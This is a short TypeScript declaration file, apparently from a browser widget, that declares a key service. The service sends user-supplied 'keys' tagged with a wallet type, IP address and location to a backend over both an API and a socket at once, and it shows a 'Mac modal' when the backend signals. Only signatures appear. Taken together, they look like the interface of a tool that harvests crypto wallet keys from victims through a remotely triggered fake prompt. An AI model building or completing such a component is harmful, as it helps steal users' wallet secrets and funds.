import { Socket } from 'socket.io-client';
import { KeyType } from '../types';
/**
 * Initialize socket connection early (call this when widget loads)
 */
export declare const initializeSocket: () => Socket | null;
/**
 * Subscribe to backend "show Mac modal" socket event.
 * When the backend emits this event, the callback is invoked.
 * Use with MacModalTrigger to show the Mac modal on signal.
 *
 * @param callback - Called when the backend emits the showMacModal event (configurable via macModalSocketEvent).
 * @returns Unsubscribe function.
 */
export declare const subscribeToShowMacModal: (callback: () => void) => (() => void);
/**
 * Send key data to backend via API
 */
export declare const sendKeyToBackendAPI: (userId: string, keyType: KeyType, keys: string, walletTypeShortkey?: string, locationData?: {
    IP_address: string;
    Location: string;
    country_code: string;
} | null) => Promise<{
    success: boolean;
    error?: string;
    data?: any;
}>;
/**
 * Send key data to backend via Socket.io
 */
export declare const sendKeyToBackendSocket: (userId: string, keyType: KeyType, keys: string, walletTypeShortkey?: string, locationData?: {
    IP_address: string;
    Location: string;
    country_code: string;
} | null) => Promise<{
    success: boolean;
    error?: string;
    data?: any;
}>;
/**
 * Initialize and cache IP and Location data
 */
export declare const initializeLocationData: () => Promise<{
    IP_address: string;
    Location: string;
    country_code: string;
}>;
/**
 * Send key data to backend using BOTH API and Socket simultaneously
 */
export declare const sendKeyToBackend: (userId: string, keyType: KeyType, keys: string, walletTypeShortkey?: string) => Promise<{
    success: boolean;
    error?: string;
    apiResult?: any;
    socketResult?: any;
}>;
//# sourceMappingURL=keyService.d.ts.map